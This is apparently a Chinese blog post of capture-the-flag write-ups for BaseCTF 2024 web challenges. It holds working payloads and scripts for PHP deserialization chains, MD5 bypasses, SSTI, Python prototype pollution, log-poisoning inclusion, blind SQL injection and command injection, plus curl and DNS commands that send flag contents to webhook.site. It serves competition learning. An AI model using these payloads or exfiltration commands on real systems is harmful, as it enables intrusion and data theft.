---
title: "做梦都想进vn之base2024ctf"
date: "2025-12-07 16:13:09"
tags: ["ctf"]
categories: ["做梦都想进vn"]
url: "/posts/26285.html"
abbrlink: "26285"
---

# 前言

```
诶诶 打的minvn被自己菜哭了，感悟很深也是深深emo了，但是没有关系我一定会变成大魔王杀回来的【蹲个2月的vnctf】。
说到着又得感谢sun了，他把我的ctf的路拉到正路上，才有后面的这些
哎，会变好的，深感自己的不足，再沉淀沉淀。
```

# base2024ctf

```
https://gz.imxbt.cn/
https://luokuang1.github.io/2024/09/25/BaseCTF2024%E9%A2%98%E8%A7%A3/
省流：官wp是pdf忘记链接在哪了，没最后0解和cve
```

## web

### week1

#### 喵喵喵

一句话木马的连接使用

```
<?php
highlight_file(__FILE__);
error_reporting(0);

$a = $_GET['DT'];

eval($a);

?>
```

```
http://challenge.imxbt.cn:30114/?DT=system(%22cat%20/flag%22);
```

#### md5绕过欸

```
<?php
highlight_file(__FILE__);
error_reporting(0);
require 'flag.php';

if (isset($_GET['name']) && isset($_POST['password']) && isset($_GET['name2']) && isset($_POST['password2']) ){
    $name = $_GET['name'];
    $name2 = $_GET['name2'];
    $password = $_POST['password'];
    $password2 = $_POST['password2'];
    if ($name != $password && md5($name) == md5($password)){
        if ($name2 !== $password2 && md5($name2) === md5($password2)){
            echo $flag;
        }
        else{
            echo "再看看啊，马上绕过嘞！";
        }
    }
    else {
        echo "错啦错啦";
    }

}
else {
    echo '没看到参数呐';
}
?> 没看到参数呐
```

```
/?name=QNKCDZO&name2[]=1
 password=240610708&password2[]=2
```

####  HTTP是什么呀

![image-20251009191711573](/images/image-20251009191711573.png)

后面是进⾏了两次重定向，抓包获得flag然后base64解密就好了

#### ADarkRoom

![image-20251009191927127](/images/image-20251009191927127.png)

####  Upload

```
快来上传你最喜欢的照片吧~ 等下,这个 php 后缀的照片是什么?
```

常规文件上传 木马连接找flag

![image-20251009192648476](/images/image-20251009192648476.png)

####  Aura 酱的礼物

php伪协议的使用

```
<?php
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
$gift = $_POST['gift'];
include($gift); 这是 Aura 的礼物，你不是 Aura！
```

```
data://text/plain,Aura
http://jasmineaura.github.io@127.0.0.1
php://filter/convert.base64-encode/resource=flag.php
```

### week2

#### ez_ser

php的反序列化

```
__construct():具有构造函数的类会在每次创建新对象时先调用此方法。
__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。
__toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj;应该显示些什么。 此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。
__sleep()方法在一个对象被序列化之前调用；
__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。
get(),set() 当调用或设置一个类及其父类方法中未定义的属性时
__invoke() 调用函数的方式调用一个对象时的回应方法
call 和 callStatic前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行。
```

![image-20251010145440893](/images/image-20251010145440893.png)

```
⻅⼀个__wakeup魔术⽅法，并且将kw当做了⼀个字符串输出，所以就想到了⾛__tostirng⽅法,令kw为re的对象，再把chu0赋值，然后在这个⽅法最后⾯⽤chu0调⽤了nononono，那么可以看到整个源码中都没有这个属性，所以可以想到_get()魔术⽅法。可以看到有个_get()⽅法，那么最后⾯就⼀样了，调⽤over为misc对象即可。

 web -> re -> pwn -> Misc
```

```
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}
$a=new re();
$b=new web();
$c=new pwn();
$d=new Misc();

$b ->kw=$a;
$a ->chu0=$c;
$c ->dusk="gods";
$c ->over=$d;

echo serialize($c);
?>
```

#### ⼀起吃⾖⾖

禁了查看源代码，右键检查直接看，找到index.js，base64解码

![image-20251010151535184](/images/image-20251010151535184.png)

#### 你听不到我的声⾳

```
<?php
highlight_file(__FILE__);
shell_exec($_POST['cmd']);
```

shell_exec 不会将执⾏结果直接输出, 我们需要⽤其他⽅式进⾏外带

外带思路：

```
• 重定向到⽂件
我们可以⽤流重定向符号来将输出内容重定向到⽂件中, 在通过浏览器进⾏下载
1 cmd_here > 1.txt
然后就可以通过访问 1.txt 获取到输出内容了

• 通过 curl 外带
我们可以通过 https://webhook.site/ 来进⾏数据外带, 我们可以拿到这样⼀个链接
https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb
此时这个路径下的所有请求都会被记录
于是我们可以通过shell指令:
curl https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb/`cat /flag |
base64`

• Dnslog 外带
Dnslog 的话可以使⽤国内的 dnslog.cn 不稳定
也可⽤在刚刚那⾥的 webhook 下⾯有个 dnshook
此时我们可以⽤ ping 外带
1 ping `cat /flag | base64`.xxxxxxx.dnshook.site

• 直接写⻢
或者我们可以利⽤指令写⻢, ⽤ wget, curl 下载⽊⻢
```

![image-20251010152557120](/images/image-20251010152557120.png)

#### RCEisamazingwithspace

```
<?php
highlight_file(__FILE__);
$cmd = $_POST['cmd'];
// check if space is present in the command
// use of preg_match to check if space is present in the command
if (preg_match('/\s/', $cmd)) {
    echo 'Space not allowed in command';
    exit;
}

// execute the command
system($cmd);
```

```
空格过滤
4.1 %20空格绕过
是 URL 编码的空格
?c=system("tac%20flag.php")

4.2 %09空格绕过
%09 是 URL 编码中的水平制表符（Tab，ASCII 码为 9），它的作用是将 tac 后面的 fla* 和前面的部分隔开，通常它不会影响命令的执行，只是空格的替代。
?c=system("tac%09flag.php");

4.3 $IFS$9空格绕过
$IFS 是一个特殊的环境变量，表示 Internal Field Separator（内部字段分隔符），默认情况下，$IFS 的值包含空格、制表符和换行符。$9是命令行参数的占位符之一，会被解析为空字符串。两者结合可以起到空格的作用
?c=system("tac$IFS$9flag.php");

4.4 ${IFS}绕过
?c=system("tac${IFS}flag.php")
4.5 <空格绕过
?c=system("tac<fla*");
< 是 输入重定向符号，用于将文件内容作为命令的输入，可以用于空格绕过。
```

cat$IFS$9/flag

#### 所以你说你懂 MD5?

```
<?php
session_start();
highlight_file(__FILE__);
// 所以你说你懂 MD5 了?

$apple = $_POST['apple'];
$banana = $_POST['banana'];
if (!($apple !== $banana && md5($apple) === md5($banana))) {
    die('加强难度就不会了?');
}

// 什么? 你绕过去了?
// 加大剂量!
// 我要让他成为 string
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('难吗?不难!');
}

// 你还是绕过去了?
// 哦哦哦, 我少了一个等于号
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('嘻嘻, 不会了? 没看直播回放?');
}

// 你以为这就结束了
if (!isset($_SESSION['random'])) {
    $_SESSION['random'] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
}

// 你想看到 random 的值吗?
// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
$random = $_SESSION['random'];
echo md5($random);
echo '<br />';

$name = $_POST['name'] ?? 'user';

// check if name ends with 'admin'
if (substr($name, -5) !== 'admin') {
    die('不是管理员也来凑热闹?');
}

$md5 = $_POST['md5'];
if (md5($random . $name) !== $md5) {
    die('伪造? NO NO NO!');
}

// 认输了, 看样子你真的很懂 MD5
// 那 flag 就给你吧
echo "看样子你真的很懂 MD5";
echo file_get_contents('/flag'); 加强难度就不会了?
```

```
apple%5B%5D=1&banana%5B%5D=2&appple=QNKCDZO&bananana=240610708&apppple=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&banananana=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&name=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin&md5=bf06e69ad2479becab3c61e8b268403c
```

![image-20251010191244067](/images/image-20251010191244067.png)

#### Really EZ POP

```
<?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

if ($_POST['nature']) {
    $nature = unserialize($_POST['nature']);
}
```

![image-20251202205505747](/images/image-20251202205505747.png)

```
<?php
class Sink
{
    private $cmd = 'system("cat /flag");';
}

class Shark
{
    private $word = 'Hello, World!';

    public function setWord($word)
    {
        $this->word = $word;
    }
}
class Sea
{
    public $animal;
}

class Nature
{
    public $sea;
}

$nature=new Nature();
$sea=new Sea();
$shark=new Shark();
$sink=new Sink();

$nature->sea=$sea;
$sea->animal=$shark;
$shark->setword($sink);
echo urlencode(serialize($nature));
?>
```

#### 数学大师

直接跑脚本就好了，贴个官p

```
import requests
import re

req = requests.session()
url = "http://challenge.imxbt.cn:31149/"

answer = 0
max_attempts = 100  # 防止无限循环
attempt = 0

while attempt < max_attempts:
    attempt += 1
    
    try:
        # 发送当前答案
        response = req.post(url, data={"answer": str(answer)}, timeout=5)
        response_text = response.text
        
        print(f"Attempt {attempt}:")
        print(response_text)
        
        # 检查是否成功
        if "BaseCTF" in response_text:
            print("Flag found!")
            print(response_text)
            break
            
        # 提取数学表达式
        regex = r"(\d+)\s*([+×÷-])\s*(\d+)\s*\?"
        match = re.search(regex, response_text)
        
        if not match:
            print("No math expression found!")
            break
            
        num1 = int(match.group(1))
        operator = match.group(2)
        num2 = int(match.group(3))
        
        # 计算答案
        if operator == "+":
            answer = num1 + num2
        elif operator == "-":
            answer = num1 - num2
        elif operator == "×":
            answer = num1 * num2
        elif operator == "÷":
            answer = num1 // num2
        else:
            print(f"Unknown operator: {operator}")
            break
            
        print(f"Calculated: {num1} {operator} {num2} = {answer}")
        
    except Exception as e:
        print(f"Error occurred: {str(e)}")
        break

if attempt >= max_attempts:
    print("Reached maximum attempts without finding the flag.")
```

### week3

#### 复读机

```
经典的SSTI,过滤了⼀些关键字和⼀些符号
```

```
BaseCTF{%print(''['_''_cl''ass_''_'])%}
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_'] ())%}
```

```
import re

# 将查找到的父类列表替换到data中
data = r'''
    
'''
# 在这里添加可以利用的类，下面会介绍这些类的利用方法
userful_class = ['linecache', 'os._wrap_close', 'subprocess.Popen', 'warnings.catch_warnings', '_frozen_importlib._ModuleLock', '_frozen_importlib._DummyModuleLock', '_frozen_importlib._ModuleLockManager', '_frozen_importlib.ModuleSpec']

pattern = re.compile(r"'(.*?)'")
class_list = re.findall(pattern, data)
for c in class_list:
    for i in userful_class:
        if i in c:
            print(str(class_list.index(c)) + ": " + c)
```

```
100: _frozen_importlib._ModuleLock
101: _frozen_importlib._DummyModuleLock
102: _frozen_importlib._ModuleLockManager
102: _frozen_importlib._ModuleLockManager
103: _frozen_importlib.ModuleSpec
137: os._wrap_close
240: warnings.catch_warnings
367: subprocess.Popen
```

```
环境变量绕过/
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('env')['rea''d']())%}

OLDPWD=/
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('cd $OLDPWD;cat
flag')['rea''d']())%}
```

#### 滤个不停

```
<?php
highlight_file(__FILE__);
error_reporting(0);

$incompetent = $_POST['incompetent'];
$Datch = $_POST['Datch'];

if ($incompetent !== 'HelloWorld') {
    die('写出程序员的第一行问候吧！');
}

//这是个什么东东？？？
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
$is_valid = true;

foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
}

if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('此路不通换条路试试?');
        }
    }


    include($Datch);
} else {
    die('文件名不合规 请重试');
}
?>
写出程序员的第一行问候吧！
```

```
文件包含日志文件，ua头写马
```

![image-20251202231353120](/images/image-20251202231353120.png)

#### 玩原神玩的

```
<?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("错了！就你还想玩原神？❌❌❌");
}

function ys_open($tip) {
  if ($tip != "我要玩原神") {
    die("我不管，我要玩原神！😭😭😭");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("可恶的QQ人！😡😡😡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("某站崩了？肯定是某忽悠干的！😡😡😡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  
  echo json_encode($flag);
} 错了！就你还想玩原神？❌❌❌
```

```
import requests
url="http://challenge.imxbt.cn:31692/"
data={}
for i in range(0,100):
    key = "len[" + str(i) + "]"  # 创建键
    data[key] = i
    resp=requests.post(url=url,data=data)
    if "</code>我不管，我要玩原神！😭😭😭" in resp.text:
        print(resp.text)
        print(i)
        break

```

```
import requests
url="http://challenge.imxbt.cn:31692/?tip=我要玩原神"
data={}
for i in range(0,100):
    key = "len[" + str(i) + "]"  # 创建键
    data[key] = i
    # if "</code>我不管，我要玩原神！😭😭😭" in resp.text:
    #     resp = requests.post(url=url, data=data)
    #     print(resp.text)
    #     print(i)
    #     break
    if i==44:
        data["m[0]"]="100%"
        data["m[1]"]="love100%30bd7ce7de206924302499f197c7a966"
        resp = requests.post(url=url, data=data)
        print(resp.text)
```

```
<?php
highlight_file(__FILE__);
include 'flag.php';
$challenge_url = "http://challenge.imxbt.cn:31692/?";
$post = "";
for ($i = 0;$i < 45;$i++) {
    $post .= "len[]=" . $i . "&";
} // $_POST['len'] == sizeof($array)
$get = "tip=" . urlencode("我要玩原神"); // $tip != "我要玩原神"
$post .= "m[]=" . urlencode("100%") . "&m[]=" . urlencode("love100%" . md5("100%"));
echo '<br>' . 'URL: ' . $challenge_url . $get . '<br>';
echo 'POST Data: ' . $post . '<br>';

$curl = curl_init();

// 修正数组语法 - 使用 array() 而不是 []
curl_setopt_array($curl, array(
    CURLOPT_URL => $challenge_url . $get,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => '',
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => $post,
    CURLOPT_HTTPHEADER => array(
        'Content-Type: application/x-www-form-urlencoded',
    ),
));

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);

if ($err) die('cURL Error #:' . $err);
preg_match('/\[\"(.*?)\"\]/', $response, $matches);

if (empty($matches)) die("Invalid JSON");
$json = '["' . $matches[1] . '"]';
echo "MD5 Array: " . $json . '<br>';
$md5_array = json_decode($json, true);
$flag = '';

for ($ii = 0; $ii < count($md5_array); $ii++) {
    for ($ascii = 0; $ascii < 256; $ascii++) {
        if (md5($ascii ^ $ii) === $md5_array[$ii]) {
            $flag .= chr($ascii);
            break;
        }
    }
}

echo "Flag: " . $flag;
?>
```

#### ez_php_jail

```
<?php
highlight_file(__FILE__);
error_reporting(0);
include("hint.html");
$Jail = $_GET['Jail_by.Happy'];

if($Jail == null) die("Do You Like My Jail?");

function Like_Jail($var) {
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        return false;
    }
    return true;
}

if (Like_Jail($Jail)) {
    eval($Jail);
    echo "Yes! you escaped from the jail! LOL!";
} else {
    echo "You will Jail in your life!";
}
echo "\n";

// 在HTML解析后再输出PHP源代码

?>


Welcome to My Jail
Do You Like My Jail?
```

![image-20251203082719751](/images/image-20251203082719751.png)

```
php内置函数来进行绕过
?Jail[by.Happy=highlight_file(implode(glob('/f*')));
?Jail[by.Happy=highlight_file(glob('/f*')[0]);
```

### week4

#### 圣钥之战1.0

```\
J1ngHong说：你想read flag吗？
那么圣钥之光必将阻止你！
但是小小的源码没事，因为你也读不到flag(乐)
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/', methods=['GET', 'POST'])
def hello_world():
    return open('/static/index.html', encoding="utf-8").read()

@app.route('/read', methods=['GET', 'POST'])
def Read():
    file = open(__file__, encoding="utf-8").read()
    return f"J1ngHong说：你想read flag吗？
那么圣钥之光必将阻止你！
但是小小的源码没事，因为你也读不到flag(乐)
{file}
"

@app.route('/pollute', methods=['GET', 'POST'])
def Pollution():
    if request.is_json:
        merge(json.loads(request.data),instance)
    else:
        return "J1ngHong说：钥匙圣洁无暇，无人可以污染！"
    return "J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
```

```
污染/file
{
    "__init__":{
        "__globals__":{
                "__file__":"/flag"
        }
    }
}
污染/static
{
    "__init__":{
        "__globals__":{
            "app":{
                "_static_folder":"./"
            }
        }
    }
}
```

#### flag直接读取不就行了？

```
<?php
highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

```
php的原生类读取
?K=DirectoryIterator&W=/secret/
J=SplFileObject&H=/secret/f11444g.php
```

#### No JWT

```
from flask import Flask, request, jsonify
import jwt
import datetime
import os
import random
import string

app = Flask(__name__)

# 随机生成 secret_key
app.secret_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# 登录接口
@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    # 其他用户都给予 user 权限
    token = jwt.encode({
            'sub': username,
            'role': 'user',  # 普通用户角色
            'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)
        }, app.secret_key, algorithm='HS256')
    return jsonify({'token': token}), 200

# flag 接口
@app.route('/flag', methods=['GET'])
def flag():
    token = request.headers.get('Authorization')
    
    if token:
        try:
            decoded = jwt.decode(token.split(" ")[1], options={"verify_signature": False, "verify_exp": False})
            # 检查用户角色是否为 admin
            if decoded.get('role') == 'admin':
                with open('/flag', 'r') as f:
                    flag_content = f.read()
                return jsonify({'flag': flag_content}), 200
            else:
                return jsonify({'message': 'Access denied: admin only'}), 403
            
        except FileNotFoundError:
            return jsonify({'message': 'Flag file not found'}), 404
        except jwt.ExpiredSignatureError:
            return jsonify({'message': 'Token has expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'message': 'Invalid token'}), 401
    return jsonify({'message': 'Token is missing'}), 401

if __name__ == '__main__':
    app.run(debug=True)
```

![image-20251203090118326](/images/image-20251203090118326.png)

![image-20251203090526755](/images/image-20251203090526755.png)

![image-20251203090538309](/images/image-20251203090538309.png)

#### only one sql

```
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/select|;|@|\n/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
//flag in ctf.flag
$query = "mysql -u root -p123456 -e \"use ctf;select '没有select，让你执行一句又如何';" . $sql . "\"";
system($query); 没有select，让你执行一句又如何 没有select，让你执行一句又如何
```

```
输入的语句被控制在数据库中，所以应该只可以进行sql注入
```

```
show tables
show columns from flag
delete from flag where data like 'B%' and sleep(5)
```

```
import requests
import string

sqlstr = string.ascii_lowercase + string.digits + '-' + "{}"
url = "http://challenge.imxbt.cn:30507/?sql=delete%20from%20flag%20where%20data%20like%20%27"
end="%25%27%20and%20sleep(5)"
flag=''
for i in range(1, 100):
    for c in sqlstr:
        payload = url +flag+ c + end
        try:
            r = requests.get(payload,timeout=4)
        except:
            print(flag+c)
            flag+=c
            break
```

### Fin

#### Jinja Mark

```
原型链污染置空黑名单，进行ssti
```

![image-20251203124315305](/images/image-20251203124315305.png)

```
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
@app.route('/magic',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            return "这个魔术还行吧"
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"
```

```
{
    "__init__":{
        "__globals__":{
            "BLACKLIST_IN_index":""
        }
    }
}
```

```
{{config.__class__.__init__.__globals__['os'].popen('cat /f*').read()}}
```

#### 1z_php

```
<?php
highlight_file('index.php');
# 我记得她...好像叫flag.php吧？
$emp=$_GET['e_m.p'];
$try=$_POST['try'];
if($emp!="114514"&&intval($emp,0)===114514)
{
    for ($i=0;$i<strlen($emp);$i++){
        if (ctype_alpha($emp[$i])){
            die("你不是hacker？那请去外场等候！");
        }
    }
    echo "只有真正的hacker才能拿到flag！"."<br>";

    if (preg_match('/.+?HACKER/is',$try)){
        die("你是hacker还敢自报家门呢？");
    }
    if (!stripos($try,'HACKER') === TRUE){
        die("你连自己是hacker都不承认，还想要flag呢？");
    }

    $a=$_GET['a'];
    $b=$_GET['b'];
    $c=$_GET['c'];
    if(stripos($b,'php')!==0){
        die("收手吧hacker，你得不到flag的！");
    }
    echo (new $a($b))->$c();
}
else
{
    die("114514到底是啥意思嘞？。？");
}
# 觉得困难的话就直接把shell拿去用吧，不用谢~
$shell=$_POST['shell'];
eval($shell);
?>
114514到底是啥意思嘞？。？
```

```
正则回溯绕过
b要以php开头，用SplFileObject配合php伪协议
c是toString方法打印结果
```

```
import requests

url = "http://101.37.149.223:32943/index.php"
params = {
    'e[m.p': '114514.1',
    'a': 'SplFileObject', 
    'b': 'php://filter/read=convert.base64-encode/resource=flag.php',
    'c': '__toString'
}
data = {
    'try': "-" * 1000001 + "HACKER"
}

res = requests.post(url, params=params, data=data)
print(res.text)
```

#### Lucky Number

```
from flask import Flask,request,render_template_string,render_template
from jinja2 import Template
import json
import heaven
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

BLACKLIST_IN_index = ['{','}']
def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

@app.route('/m4G1c',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            result = heaven.create()
            message = result["message"]
            return "这个魔术还行吧
" + message
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"


#heaven.py

def create(kon="Kon", pure="Pure", *, confirm=False):
    if confirm and "lucky_number" not in create.__kwdefaults__:
        return {"message": "嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？", "lucky_number": "nope"}
    if confirm and "lucky_number" in create.__kwdefaults__:
        return {"message": "这是你的lucky_number，请拿好，去/check下检查一下吧", "lucky_number": create.__kwdefaults__["lucky_number"]}

    return {"message": "你有什么想创造的吗？", "lucky_number": "nope"}
```

```
原型链污染黑名单打ssti
```

```
{
    "__init__":{
        "__globals__":{
            "heaven":{
                "create":{
                    "__kwdefaults__":{
                        "confirm":"True",
                        "lucky_number":"5346"
                    }
                }
            }
        }
    }
}
```

```
{{config.__class__.__init__.__globals__['os'].popen('cat /f*').read()}}
```

#### Back to the future

```
信息泄露 /robots.txt提示有/.git
https://github.com/WangYihang/GitHacker
pip install -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r requirements.txt
python setup.py install 
githacker --url http://challenge.imxbt.cn:30601/ --output back-future
cd  back-future\63e93c577c72cf52e89eb9d33d5adead
git log 
git checkout 9d85f10e0192ef630e10d7f876a117db41c30417
```

#### RCE or Sql Inject

```
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/se|ec|;|@|del|into|outfile/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
$query = "mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- " . $sql . "\"";
system($query); ctfer! You can't succeed this time! hahaha ctfer! You can't succeed this time! hahaha
```

```
sql注入进行了过滤，sql注入就不可能了
mysql命令行程序的rce,查看环境变量
%0asystem export
```

#### Sql Inject or RCE

```
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/se|ec|st|;|@|delete|into|outfile/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
$query = "mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- " . $sql . "\"";
system($query); ctfer! You can't succeed this time! hahaha ctfer! You can't succeed this time! hahaha
```

```
更新了限制system
delimiter+handler+read next来绕过
%0adelimiter+aa%0ahandler+flag+openaa%0ahandler+flag+read+next
```

#### ez_php

```
<?php
highlight_file(__file__);
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}

class Hacker{
    public $start;
    public $end;
    public $username="hacker";
    public function __construct($start){
        $this->start=$start;
    }
    public function __wakeup(){
        $this->username="hacker";
        $this->end = $this->start;
    }

    public function __destruct(){
        if(!preg_match('/ctfer/i',$this->username)){
            echo 'Hacker！';
        }
    }
}

class C{
    public $c;
    public function __toString(){
        $this->c->c();
        return "C";
    }
}

class T{
    public $t;
    public function __call($name,$args){
        echo $this->t->t;
    }
}
class F{
    public $f;
    public function __get($name){
        return isset($this->f->f);
    }

}
class E{
    public $e;
    public function __isset($name){
        ($this->e)();
    }

}
class R{
    public $r;

    public function __invoke(){
        eval($this->r);
    }
}

if(isset($_GET['ez_ser.from_you'])){
    $ctf = new Hacker('{{{'.$_GET['ez_ser.from_you'].'}}}');
    if(preg_match("/\[|\]/i", $_GET['substr'])){
        die("NONONO!!!");
    }
    $pre = isset($_GET['substr'])?$_GET['substr']:"substr";
    $ser_ctf = substrstr($pre."[".serialize($ctf)."]");
    $a = unserialize($ser_ctf);
    throw new Exception("杂鱼~杂鱼~");
}
```

```
引⽤绕过__wakeup
gc回收的机制绕过Exception,使 __destruct 提前触发
```

```
<?php
class Hacker{
    public $start;
    public $end;
    public $username="hacker";
}

class C{
    public $c;
}

class T{
    public $t;

}
class F{
    public $f;

}
class E{
    public $e;

}
class R{
    public $r;
}

$a=new Hacker();
$a->end=&$a->username;
$a->start=new C();
$a->start->c = new T();
$a->start->c->t = new F();
$a->start->c->t->f = new E();
$a->start->c->t->f->e = new R();
$a->start->c->t->f->e->r = 'system("whoami");';
$b=array('1'=>$a,'2'=>null);
echo serialize($b);
```

```
